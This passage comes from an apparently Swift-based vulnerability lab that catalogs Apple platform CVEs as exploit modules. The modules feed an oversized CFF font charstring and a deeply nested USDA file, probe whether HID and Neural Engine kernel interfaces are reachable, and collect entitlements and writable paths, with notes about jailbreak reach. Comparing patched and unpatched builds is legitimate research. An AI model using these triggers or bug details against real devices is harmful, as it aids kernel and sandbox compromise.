                    let detail = try Runners.loadFont(cff)
                    ctx.disarm("font.cff", detail)
                    return ModuleOutcome(headline: tl("字体已加载并绘制"), detail: detail,
                                         evidence: ["CFF \(cff.count) B", tl("charstring 推 300 个操作数")],
                                         artifacts: [url])
                } catch {
                    // A refusal is the informative result here: it tells you which stage
                    // rejected the font, which is exactly what the A/B compares.
                    let message = (error as? LocalizedError)?.errorDescription ?? error.localizedDescription
                    ctx.disarm("font.cff", "rejected: \(message)")
                    return ModuleOutcome(
                        headline: tl("字体在解析阶段被拒绝"),
                        detail: "\(message)" + tl("\n\n种子 ") + "\(cff.count)" + tl(" B，单个 charstring 连续推入 300 个操作数后 endchar。\n") +
                                tl("27.0 期望：push 路径无计数检查，操作数栈越界。\n") +
                                tl("27.2 期望：Push/Pop 两道栈保护在解释前拒绝该字体。\n") +
                                tl("被拒绝本身即说明校验发生在解释器之前 —— 这是该构建上有效的观测。"),
                        evidence: ["CFF \(cff.count) B", tl("操作数 300 > 栈容量 48")],
                        artifacts: [url])
                }
            }),

        ExploitModule(
            id: "mdl.usda",
            titleZh: "USDA 声明嵌套深度",
            cve: "CVE-2026-112485",
            component: "Model I/O · libusd_ms",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "Model I/O 的修复载体为 libusd_ms 24.1.30 → 24.1.32：经 64 位检查的图像分配、Ptex log2 与页保护、USDA 声明嵌套上限、SdfZipFile 尺寸检查。ModelIO.dylib 自身不含任何修复。",
            notesZh: "2000 层嵌套的 def Xform。27.2 会在嵌套上限处拒绝，27.0 递归下去。",
            run: { ctx in
                guard let usda = ctx.seed("deep_nest.usda") else {
                    throw LabError(message: tl("种子缺失 deep_nest.usda"))
                }
                let url = ctx.write("deep_nest.usda", usda)
                ctx.arm("mdl.usda", "MDLAsset")
                let detail = try Runners.loadUSDA(at: url)
                ctx.disarm("mdl.usda", detail)
                return ModuleOutcome(headline: tl("资产载入存活"), detail: detail,
                                     evidence: ["USDA \(usda.count) B", tl("2000 层嵌套")],
                                     artifacts: [url])
            }),
    ]

    // MARK: - Probes

    static let probes: [ExploitModule] = [
        ExploitModule(
            id: "probe.hid",
            titleZh: "IOHIDFamily 预解析数据表索引",
            cve: "CVE-2026-112515",
            component: tl("IOHIDFamily · caps 表查找"),
            primitive: .oobRead,
            reach: .peripheral,
            tier: 2,
            summaryZh: "记录中的有符号 int32 索引被直接以 ×0x14 加至 caps 表基址，仅存在 32 位乘法溢出陷阱，缺少索引与计数的比较。负索引读到表下方，超界索引读到相邻内核堆；读出的 u32 进入元素/事件数据，构成内核内存泄露。27.2 补入 cmp idx,count、NULL 守卫与 64 位索引运算。",
            notesZh: "入口是内核侧序列化的 \"hid \" 预解析容器。应用侧能不能把这样的数据推进去，本身就是这一步要回答的问题。",
            run: { ctx in
                ctx.arm("probe.hid", "probe")
                let iokit = Runners.dlopenProbe(
                    "/System/Library/Frameworks/IOKit.framework/IOKit",
                    symbols: ["IOHIDManagerCreate", "IOHIDDeviceGetProperty", "IOHIDEventCreateCopy",
                              "IOHIDEventSystemClientCreate", "IOHIDEventCreateData"])
                let gc = Runners.dlopenProbe(
                    "/System/Library/Frameworks/GameController.framework/GameController",
                    symbols: ["GCController", "GCHIDEventSource", "GCExtendedGamepad"])
                ctx.disarm("probe.hid", "probe complete")
                return ModuleOutcome(headline: tl("HID 路径可达性"), detail: iokit + "\n" + gc)
            }),

        ExploitModule(
            id: "probe.ane",
            titleZh: "ANE 内核接口可达性",
            cve: "CVE-2026-112696 / 84494",
            component: "AppleH16ANEInterface",
            primitive: .oobWrite,
            reach: .kernel,
            tier: 2,
            summaryZh: "未检查的 program symbolIndex 直接用于索引内核表且存在回写 —— 与公告所称「写内核内存」的形状一致。本模块仅探测应用能否触及 ANE 的用户态入口。",
            notesZh: "10.19.6 → 10.102.4，是整个 kext 差异里改动最大的一组之一。",
            run: { ctx in
                ctx.arm("probe.ane", "probe")
                let r1 = Runners.dlopenProbe(
                    "/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine",
                    symbols: ["_ANEClient", "_ANEProgram", "_ANEModel", "_ANERequest"])
                let r2 = Runners.dlopenProbe(
                    "/System/Library/PrivateFrameworks/CoreML.framework/CoreML",
                    symbols: ["MLModel", "MLComputePlan"])
                ctx.disarm("probe.ane", "probe complete")
                return ModuleOutcome(headline: tl("ANE 用户态入口探测"), detail: r1 + "\n" + r2)
            }),

        ExploitModule(
            id: "probe.privset",
            titleZh: "本进程权限面",
            cve: "—",
            component: tl("沙盒 / 签名 / entitlements"),
            primitive: .probe,
            reach: .inProcess,
            tier: 3,
            summaryZh: "这一套漏洞链的最终权限上限，取决于进程自己已经拿到了什么。csops 标志、entitlements、以及沙盒允许的路径集合，三者一起定义了越狱工具能做到的最远处。",
            notesZh: "路径矩阵里凡是「可写」的目录，就是改机工具真正的活动范围。",
            run: { ctx in
                ctx.arm("probe.privset", "collect")
                var lines: [String] = []
                let cs = CodeSign.current()
                lines.append("csflags = 0x" + String(cs.flags, radix: 16) + "  [\(cs.descriptions.joined(separator: " "))]")
                let ents = Entitlements.dump()
                if ents.isEmpty {
                    lines.append(tl("entitlements: 无法读取（SecTask 不可用或为空）"))
                } else {
                    for key in ents.keys.sorted() {
                        let value = "\(ents[key]!)"
                        lines.append("  \(key) = \(value.prefix(120))")
                    }
                }
                let writable = Probe.interestingRoots.map { Probe.path($0) }.filter { $0.writable }
                lines.append(tl("可写根目录: ") + "\(writable.isEmpty ? tl("无") : writable.map { $0.path }.joined(separator: ", "))")
                ctx.disarm("probe.privset", "collected")
                return ModuleOutcome(headline: tl("权限面已采集"), detail: lines.joined(separator: "\n"))
            }),
    ]
}

extension Catalog {
    static var groups: [(String, [ExploitModule])] {
        [
            (tl("新收录"), arrivals),
            ("CoreGraphics", coreGraphics),
            (tl("ImageIO · 图像解析"), imageIO),
            (tl("ImageIO · 纹理与编码"), imageIO2),
            ("libarchive", archive + archive2),
            ("CoreMedia", coreMedia),
            (tl("跨沙盒"), crossSandbox),
            (tl("XNU 内核"), kernel),
            (tl("音频栈"), audio + audio2),
            (tl("视频编解码"), video),
            (tl("字体 / Model I/O"), fonts + font2),
            ("kext / IOKit", kext),
            (tl("应用与系统进程"), userspace),
            (tl("工具链自检"), tooling),
            (tl("可达性探测"), probes),
        ]
    }

    static var byID: [String: ExploitModule] {
        Dictionary(uniqueKeysWithValues: all.map { ($0.id, $0) })
    }
}
